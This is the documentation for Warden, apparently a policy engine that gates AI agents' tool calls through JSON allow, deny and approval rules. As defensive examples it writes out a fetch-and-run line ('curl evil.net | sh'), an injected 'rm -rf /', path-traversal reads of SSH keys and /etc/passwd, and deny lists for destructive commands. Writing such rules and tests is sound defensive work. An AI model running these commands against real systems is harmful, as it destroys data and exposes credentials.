# Writing policies

Rules live in `policies/default.json` (`warden init` creates it). The default:

| Tool | Decision |
|---|---|
| `read_file` | allow under `/workspace/`, otherwise deny |
| `write_file` | human approval under `/workspace/`, otherwise deny |
| `delete_file` | always deny |
| `send_email` | allow to `@example.com` addresses, otherwise deny |
| anything else | deny |

The simplest rules just name a tool:

```json
{
  "rules": [
    { "id": "allow-read", "tool": "read_file", "effect": "allow" },
    { "id": "approve-send", "tool": "send_email", "effect": "require_approval" },
    { "id": "block-delete", "tool": "delete_file", "effect": "deny" }
  ]
}
```

- A rule matches when its `tool` **exactly** equals the requested tool.
- **No matching rule → deny.**
- **Several matching rules → the most restrictive wins**: deny > require_approval > allow.
- Tool names: letters, digits, `_`, `.`, `-`, up to 64 characters. Case-sensitive:
  `getIssue` and `getissue` are different tools (`warden check` warns, W020).
- Rule ids: lowercase letters, digits, `_`, `.`, `-`, up to 64 characters.
- If the file is missing or **any** rule is invalid, Warden loads no rules and denies everything.
  The log says where the problem is.
- Rules are loaded at startup. Restart the server after editing.
- Add `"message": "..."` to a rule to explain the decision. It becomes the `reason` in the
  response (one line, up to 200 characters), e.g.
  `{ "id": "big-invoice", ..., "message": "Invoices over €500 need finance approval" }`.

### Editor autocomplete

Start a policy with a `$schema` line and editors like VS Code will autocomplete fields and
underline mistakes as you type (Warden itself ignores this line):

```json
{
  "$schema": "https://raw.githubusercontent.com/wi-abas/agent-warden/main/schemas/policy-v1.json",
  "rules": [ ... ]
}
```

`warden init` adds it for you. `uv run warden schema` prints the schema.

The `v1` in the link is the version of the policy **format**, not of Warden. It only gets
backwards-compatible additions; a breaking change would get a new `policy-v2.json`, so
existing links keep working.

## Argument rules

A rule can add `when` conditions. It then matches only if **all** of them hold:

```json
{ "id": "big-invoice",   "tool": "send_invoice", "effect": "require_approval",
  "when": [ { "arg": "amount", "op": "gt",  "value": 500 } ] },
{ "id": "small-invoice", "tool": "send_invoice", "effect": "allow",
  "when": [ { "arg": "amount", "op": "gte", "value": 0 },
            { "arg": "amount", "op": "lte", "value": 500 } ] }
```

The `gte 0` matters: without it, `-500` is "at most 500" and would be allowed
(`warden check` warns, W021).

| `op` | Meaning | `value` |
|---|---|---|
| `eq`, `neq` | equals / doesn't equal | text, number or true/false |
| `gt`, `gte`, `lt`, `lte` | number comparison | number |
| `in` | is one of | list of 1–100 text/number values |
| `startswith`, `endswith` | text starts / ends with | non-empty text |
| `exists`, `missing` | argument is present / absent | *(no value)* |
| `host_in` | a URL's real host is one of these (any port or case; `".x.com"` = x.com and its subdomains). Only `http`/`https` URLs unless the condition has `schemes` | list of lowercase host names |
| `contains` | the text contains this text (or any of a list). **Not allowed in `allow` rules** | non-empty text, or list of 1–100 texts |

- **Warden never gives a looser answer because an argument is missing.** On a `deny` or
  `require_approval` rule a missing argument counts as matching (the rule applies); on an
  `allow` rule it doesn't. So `deny send_email when recipient startswith "evil"` can't be
  dodged by leaving `recipient` out. Use `exists` / `missing` to say exactly what you mean.
- An argument of the **wrong type** (e.g. `"50000"` as text for `gt`), or a value with
  `..` as a path part for `startswith` (`/data/../x`, `workspace/%2e%2e/x`; not `wait...`),
  **denies the whole request**. This stops a `deny` rule being dodged.
- `true` is never treated as the number `1`.
- Add `"ignore_case": true` to compare text without caring about upper/lower case
  (works with `eq`, `neq`, `in`, `startswith`, `endswith`, `contains`). Use it for email domains:
  `{ "arg": "to", "op": "endswith", "value": "@mycompany.com", "ignore_case": true }`.
  Where software disagrees about case and it would change the answer (`ß` and `ss`, `ς`
  and `σ`, Turkish `İ`/`ı` and `i`), **the whole request is denied**: `eve@busineß.com`
  is not at `@business.com`, and must not dodge a rule about it either.
- **Blocking or allowing sites:** use `host_in`, not `startswith`. It compares the URL's
  real host, so `http://`, ports, upper case and trailing dots can't dodge it:
  `{ "arg": "url", "op": "host_in", "value": ["evil.net", ".evil.net"] }`. International host
  names must be written in punycode (`xn--strae-oqa.de`, not `straße.de`), both in the
  policy and in requests; the Unicode form is refused because different software
  converts it differently. A host with characters that can't be in a host name
  (`evil.net;.example.com`) denies the request, also when a text rule compares a URL.
- **`host_in` and URL schemes.** By default `host_in` only accepts `http://` and
  `https://` URLs (any case). Any other scheme (`ftp://`, `gopher://`, `file://`,
  `ws://`, ...) can't be checked by the condition, and **the whole request is denied**,
  whatever the rule's effect: an allow list of hosts must not let a tool talk FTP or
  read `file://` URLs, and a deny rule must not be dodged with an odd scheme. If a tool
  really needs other schemes, list them all on the condition:
  `{ "arg": "url", "op": "host_in", "value": ["ws.example.com"], "schemes": ["https", "wss"] }`.
  `schemes` replaces the default (`["https"]` also refuses plain `http`); 1–10 lowercase
  names; only allowed on `host_in`. Use the same `schemes` on every `host_in` condition
  for one argument (`warden check` warns, W017): every rule is evaluated, so a URL outside
  one rule's list denies the request even if another rule would allow it.
- **Ports in URLs** must be 1–65535 without a leading zero. `:0`, `:99999` or `:0443`
  (libraries disagree about what they reach) deny the request wherever a rule compares
  URLs (`host_in` or text ops with a URL value).
- **`contains`** is a tripwire for `deny` / `require_approval` rules:
  `{ "arg": "command", "op": "contains", "value": ["rm -rf", "mkfs"] }`. It compares
  text, not meaning: `rm -fr`, `rm -r -f`, two spaces or `/bin/rm -rf` don't contain
  `"rm -rf"`. That's why it's refused in `allow` rules (`allow when command contains
  "git status"` would also allow `git status; curl evil.net | sh`); allow-list exact
  commands with `eq` / `in` instead. Hidden or look-alike characters deny the request.
- Text a rule compares may not contain invisible characters or look-alike Unicode
  (full-width letters, look-alike dots), and paths may not contain `%`-escapes; such
  requests are denied.
  In a URL's path (compared as text; `host_in` only looks at the host), ordinary escapes (`%20`, `caf%C3%A9`) are fine; hidden dot segments
  (`..;/`, `..%20/`), control characters (`%00`), overlong UTF-8 (`%c0%ae`) and malformed
  escapes (`%u002e`, a lone `%`) are denied.
- An email address a rule compares must be one plain address: no display name, list or
  quotes, and a normal name before the `@` (not empty, no `%`, `!`, `:` or `\`, no
  leading, trailing or double dots). Those are routing tricks some mail software still
  follows (`user%evil.net@example.com` can be relayed to evil.net); they're denied.
- No regex, no code.

### "Otherwise": a stricter answer when the conditions don't hold

A rule can say what happens when its conditions **don't** all hold:

```json
{ "id": "fetch-our-hosts", "tool": "fetch", "effect": "allow",
  "when": [ { "arg": "url", "op": "host_in", "value": [".example.com"] } ],
  "otherwise": "require_approval" }
```

Fetching from `*.example.com` is allowed; any other host needs a human.

- `otherwise` must be **stricter** than `effect` (`allow` → `require_approval` or `deny`;
  `require_approval` → `deny`), and `when` must not be empty. Anything else is a load
  error, so `otherwise` can never loosen an answer.
- Every condition holds → `effect`. One is false, or its argument is **missing** →
  `otherwise` (when in doubt, the stricter branch). An argument that **can't be
  checked** (wrong type, path/URL/email trick, a non-http scheme) still **denies the
  whole request**.
- The rule's answer joins all other matching rules as usual: most restrictive wins.
- The decision names the rule; on the `otherwise` branch the reason is
  `rule 'fetch-our-hosts': conditions not met` (the rule's `message` is used for the
  `effect` branch), so the audit log shows which branch decided.
- There's no general `not`/`or`: one rule is one AND of conditions plus one fallback.
  Avoid `neq` / `missing` in such a rule (a double negative; `warden check` warns, W016).

### Nested arguments

`arg` can point inside an object with a list of keys:

```json
{ "arg": ["headers", "to"], "op": "endswith", "value": "@mycompany.com", "ignore_case": true }
```

- Same rules as top-level arguments: a missing key anywhere on the path counts as
  missing (deny rules apply, allow rules don't), and every type and trick check applies.
- If something on the path isn't an object (`"headers": "x"`, a list, a number), the whole
  request is denied: it can't be checked.
- Lists are never searched: `"to": ["a@x.com", "b@y.com"]` can't be checked with
  `endswith` (wrong type, so denied). Up to 8 levels.
- A plain name is always a top-level argument, even with a dot in it: `"file.name"` is
  the argument called `file.name`, never `file` → `name`. Only the list form looks inside
  objects, so every rule has exactly one meaning.
- Argument lists (`tools`) only cover top-level names, so other keys inside an object
  (`["headers", "bcc"]`) aren't checked by them. Prefer `allow` rules for nested values
  (`warden check` warns, W013).

## Tool argument lists

Optionally, list the arguments each tool may receive. Anything else is denied before any
rule runs, so an agent can't slip in an argument no rule checks (like `bcc`):

```json
{
  "tools": {
    "send_email": { "arguments": ["to", "subject", "body"], "required": ["to"] }
  },
  "rules": [ ... ]
}
```

- An argument not in `arguments` → deny (`"unexpected argument"`; the name isn't echoed,
  since it comes from the agent).
- A name in `required` that's missing → deny (`"missing required argument 'to'"`).
- Tools without an entry work as before.
- **Argument lists check names, not types.** `"subject": {"x": [1, 2]}` or `"body": 5`
  passes the list above. A value's type is only checked when a rule's condition compares
  that argument (a wrong type there denies the request). So every argument whose value
  matters needs a condition. Types in argument lists are planned.

## Common patterns

One policy with six everyday patterns. It passes `warden check --strict`, and every
behaviour described below was checked with `warden test`. Each tool has an argument
list, so an agent can't add an argument no rule looks at (like `bcc`).

```json
{
  "tools": {
    "run_command": { "arguments": ["command"], "required": ["command"] },
    "run_shell": { "arguments": ["command"], "required": ["command"] },
    "send_email": { "arguments": ["to", "subject", "body"], "required": ["to"] },
    "pay_invoice": { "arguments": ["vendor", "amount"], "required": ["vendor", "amount"] },
    "read_file": { "arguments": ["path"], "required": ["path"] }
  },
  "rules": [
    { "id": "safe-commands", "tool": "run_command", "effect": "allow",
      "when": [ { "arg": "command", "op": "in", "value": ["git status", "git diff", "ls", "pytest"] } ] },

    { "id": "shell-with-approval", "tool": "run_shell", "effect": "require_approval" },
    { "id": "shell-never-wipe", "tool": "run_shell", "effect": "deny",
      "when": [ { "arg": "command", "op": "contains", "value": ["rm -rf", "mkfs"] } ],
      "message": "Never wipe disks or folders" },

    { "id": "email-colleagues", "tool": "send_email", "effect": "allow",
      "when": [ { "arg": "to", "op": "endswith", "value": "@mycompany.com", "ignore_case": true } ],
      "otherwise": "require_approval" },

    { "id": "pay-small", "tool": "pay_invoice", "effect": "allow",
      "when": [ { "arg": "amount", "op": "gte", "value": 0 },
                { "arg": "amount", "op": "lte", "value": 100 } ] },
    { "id": "pay-medium", "tool": "pay_invoice", "effect": "require_approval",
      "when": [ { "arg": "amount", "op": "gt", "value": 100 },
                { "arg": "amount", "op": "lte", "value": 5000 } ] },
    { "id": "pay-large", "tool": "pay_invoice", "effect": "deny",
      "when": [ { "arg": "amount", "op": "gt", "value": 5000 } ] },

    { "id": "read-project", "tool": "read_file", "effect": "allow",
      "when": [ { "arg": "path", "op": "startswith", "value": "/home/me/project/" } ] }
  ]
}
```

**Allowlist of commands** (`safe-commands`). `in` compares the **whole** value, so
`"git status"` is allowed but `"git status; rm -rf /"`, `"ls -la"` and `["ls"]` (a list, not
text) are denied. Anything not listed falls through to "no matching rule": deny.

**Email to your own domain** (`email-colleagues`, its `when`). `endswith` with
`ignore_case` allows `Ann@MyCompany.com`, but not `bob@gmail.com` or the look-alike
`ann@mycompany.com.evil.net`. A `bcc`, or a missing `to`, is denied by the argument list.
To deny outsiders instead of asking a human, remove `otherwise`.

**Shell with a tripwire** (`shell-*`). Every command needs a human, and commands
containing `rm -rf` or `mkfs` are denied outright, so a tired approver can't wave them
through. `contains` compares text (`rm -fr` slips past it), so it only ever makes the
answer stricter here; the approval is the real control.

**External email needs approval** (`email-colleagues`, its `otherwise`). The same rule
sends `bob@gmail.com` and the look-alike to a human. A missing `to` never gets that far:
`to` is in `required`, so it's denied (`"missing required argument 'to'"`). Without
`required`, `otherwise` would send it to a human too.

**Payment thresholds** (`pay-*`). Up to 100: allow. 101 to 5000: approval. Over 5000:
deny. Note the `gte 0` on the allow rule: without it, `-500` is "less than 100" and
would be allowed. `"amount": "50"` (text, not a number) denies the whole request. Where
ranges overlap, the most restrictive rule wins.

**Path confined to a folder** (`read-project`). End the prefix with `/` (otherwise
`/home/me/project-secrets/` also matches; `warden check` warns, W005). `..` in the path
is denied, so `/home/me/project/../.ssh/id_rsa` can't escape. Warden doesn't resolve
symlinks: a symlink inside the folder that points outside it still passes.

Test your own version the same way (`policy` is relative to the test file):

```json
{
  "policy": "policy.json",
  "cases": [
    { "name": "listed command",
      "request": { "tool": "run_command", "arguments": { "command": "git status" } },
      "expect": "allow", "rule": "safe-commands" },
    { "name": "command with extra",
      "request": { "tool": "run_command", "arguments": { "command": "git status; rm -rf /" } },
      "expect": "deny" },
    { "name": "look-alike domain",
      "request": { "tool": "send_email", "arguments": { "to": "ann@mycompany.com.evil.net" } },
      "expect": "require_approval", "rule": "email-colleagues" },
    { "name": "outsider",
      "request": { "tool": "send_email", "arguments": { "to": "bob@gmail.com" } },
      "expect": "require_approval", "rule": "email-colleagues" },
    { "name": "missing recipient",
      "request": { "tool": "send_email", "arguments": { "subject": "hi" } },
      "expect": "deny", "rule": null, "reason": "missing required argument 'to'" },
    { "name": "medium payment",
      "request": { "tool": "pay_invoice", "arguments": { "vendor": "acme", "amount": 101 } },
      "expect": "require_approval", "rule": "pay-medium" },
    { "name": "negative payment",
      "request": { "tool": "pay_invoice", "arguments": { "vendor": "acme", "amount": -500 } },
      "expect": "deny", "rule": null },
    { "name": "escape with ..",
      "request": { "tool": "read_file", "arguments": { "path": "/home/me/project/../.ssh/id_rsa" } },
      "expect": "deny" }
  ]
}
```

```sh
uv run warden check policy.json --strict
uv run warden test policy-tests.json
```

## Per-agent rules

Optional. A rule with `"agents"` applies only to the agents it lists; a rule without it
applies to every agent. Here the billing agent may pay up to €500, the research agent
may only read, and nobody else may do either:

```json
{
  "rules": [
    { "id": "billing-pays-small", "tool": "pay", "effect": "allow",
      "agents": ["billing-agent"],
      "when": [{ "arg": "amount", "op": "gte", "value": 0 },
               { "arg": "amount", "op": "lte", "value": 500 }] },
    { "id": "research-reads", "tool": "read_file", "effect": "allow",
      "agents": ["research-agent", "billing-agent"],
      "when": [{ "arg": "path", "op": "startswith", "value": "/workspace/" }] }
  ]
}
```

- **Exact, case-sensitive names.** `"billing-agent"` doesn't match `"Billing-agent"`,
  and there are no wildcards: `"billing-*"` is not a pattern (it would hand a newly added
  `billing-evil` the same permissions). 1 to 100 names, no duplicates. An empty list or
  `null` is refused (leave the key out for "every agent").
- **Most restrictive still wins**, across every rule that matches. A per-agent `allow`
  never overrides a `deny` or `require_approval` that applies to everyone. To give one
  agent more than the others, limit the stricter rule to the other agents.
- **Requires agent tokens.** Without `--agents`, `agent_id` is self-declared, so any
  local program could claim a per-agent allow or dodge a per-agent deny. `warden serve`
  refuses to start when the policy has a per-agent rule and no agents file. It also
  refuses to start if a rule (or `limits.agents`) names an agent that isn't in the
  agents file: a typo in a deny rule would otherwise protect nothing.
- Check the names before starting: `uv run warden check policy.json --agents warden-agents.json`
  (W014, W015). Test both sides with `warden test` cases that set `"agent_id"`: one for
  the agent that should get the allow, one for an agent that shouldn't.

## Rate limits and approval quotas

Optional. Each agent gets a request budget, a cap on how many approvals it may have
waiting, and a rejection window, so one agent can't flood Warden, crowd out the others or
nag a reviewer:

```json
"limits": {
  "default": { "requests_per_minute": 1200, "max_pending_approvals": 100,
               "rejection_window_seconds": 900 },
  "agents": { "billing-agent": { "requests_per_minute": 30, "max_pending_approvals": 5 } }
}
```

- An agent's own value wins, then `default`, then the built-in defaults (the values above).
- Over the request budget: HTTP 429, `"decision": "deny"`, with a `Retry-After` header.
  The budget refills continuously (a burst of up to the per-minute value is allowed).
  Approval polls count too.
- Over the approval quota: `deny`, "too many pending approvals for this agent". Asking
  again for the same action reuses its approval and doesn't count twice.
  `"max_pending_approvals": 0` turns every `require_approval` for that agent into `deny`.
- **Rejection window** (sticky rejections): after a human rejects (or revokes) an
  approval, the same agent asking for the exact same action within
  `rejection_window_seconds` gets `deny`, "rejected by a human; this exact action is
  refused until ... (approval ID)", instead of a new pending approval. Default 900
  (15 minutes), `0` = off (a new pending approval at once), at most 604800 (7 days).
  Only the exact action (same agent, tool and arguments) is refused; rejections don't
  count toward the approval quota. An admin can lift one early (`warden approvals lift
  ID`, see [api.md](api.md#sticky-rejections)). `warden limits set` doesn't edit it yet:
  edit the JSON.
- Without agent tokens (`--agents`), an agent can dodge its limit by using a new
  `agent_id`. Limits reset when Warden restarts.

Change them without editing JSON by hand (restart Warden afterwards):

```sh
uv run warden limits                                          # show what applies
uv run warden limits set --requests-per-minute 2000 --pending 200
uv run warden limits set --agent billing-agent --requests-per-minute 30
uv run warden limits reset --agent billing-agent              # back to the defaults
```

`--policy FILE` (or `WARDEN_POLICY`) picks the file. The new file must pass
`warden check` before it replaces the old one, and keeps its permissions; it's
rewritten with 2-space indentation.

## Checking a policy

```sh
uv run warden check policies/default.json
```

Validates the file without starting the server, and warns about rules that probably don't
do what you meant:

| Code | Warning |
|---|---|
| W001 | A tool has "deny when..." rules but no argument list, so unexpected arguments aren't checked |
| W002 | No rules at all: everything is denied |
| W003 | A rule can never apply, because a stricter unconditional rule (or a stricter rule with `otherwise`) always wins |
| W004 | A rule duplicates another |
| W005 | A path prefix without a trailing `/` (`"/data"` also matches `"/database"`), absolute or relative |
| W006 | A tool has an argument list but no rules: it's always denied |
| W007 | A condition checks an argument that isn't in the tool's argument list (typo?) |
| W008 | An email address is compared case-sensitively (`x@EVIL.com` would slip past) |
| W009 | A deny rule compares a path or URL case-sensitively (`/ETC/passwd`, `HTTPS://EVIL.NET/` slip past) |
| W010 | An `allow` rule uses `neq` or `missing` ("allow everything except X"), a deny-list in disguise |
| W011 | A URL prefix has no `/` after the host (`"https://api.x.com"` also matches `"https://api.x.com.evil.net"`) |
| W012 | A deny rule blocks a URL by comparing text; use `host_in` instead |
| W013 | A deny rule checks a nested value (`["headers", "to"]`): other keys in that object aren't checked |
| W014 | With `--agents FILE`: a rule's `agents` (or `limits.agents`) names an agent that isn't in the file (typo?) |
| W015 | Two agent names differ only in upper/lower case (`Billing` and `billing` are different agents) |
| W016 | A rule with `otherwise` uses `neq` or `missing`: a double negative, easy to get backwards |
| W017 | Two `host_in` conditions on the same argument of a tool accept different `schemes` |
| W018 | A deny rule compares a host name case-sensitively (`EVIL.COM` slips past) |
| W019 | An `allow` rule uses `endswith` with a bare domain (`"mycompany.com"` also matches `"evilmycompany.com"`) |
| W020 | Two tool names differ only in upper/lower case (`getIssue` and `getissue` are different tools) |
| W021 | An `allow` rule caps a number (`lt`/`lte`) with no minimum, so `-1000000000` is allowed too |

`--agents FILE` checks the agent names that per-agent rules and `limits.agents` use.
Without it, a policy with per-agent rules gets a note (not a warning) that
`warden serve` will need `--agents`. W003 and W004 take `agents` into account: a deny
for every agent makes a per-agent allow dead, but a per-agent deny doesn't kill an allow
for everyone.

Exit code `1` on errors; with `--strict`, also on warnings (useful in CI).

## Testing a policy

`warden check` finds rules that look wrong; `warden test` proves the policy decides what
you expect. Write example requests and the answer each should get:

```json
{
  "policy": "../policies/default.json",
  "cases": [
    { "name": "read in the workspace",
      "request": { "tool": "read_file", "arguments": { "path": "/workspace/a.txt" } },
      "expect": "allow", "rule": "read-workspace" },
    { "name": "escape with ..",
      "request": { "tool": "read_file", "arguments": { "path": "/workspace/../etc/passwd" } },
      "expect": "deny" }
  ]
}
```

```sh
uv run warden test examples/policy-tests.json
uv run warden test my-tests.json --policy other-policy.json
```

- `policy` is relative to the test file; `--policy` overrides it.
- `request`: `tool`, `arguments`, optional `agent_id`. Validated exactly like
  `/v1/evaluate`; invalid input counts as `deny` with no rule.
- `expect`: `allow`, `deny` or `require_approval`. Optional `rule` (the rule id that
  must decide, or `null` for "no rule matched") and `reason` (exact text).
- Runs the engine only: no server, audit log, approvals or rate limits.
- A broken policy is an error (exit 2), not "everything denied, tests pass".
- Exit `0` all passed, `1` a case failed. Add it to CI next to `warden check --strict`.
- Add a case for every trick you're worried about (`..`, look-alike domains, extra
  arguments); `examples/policy-tests.json` has a starting set.
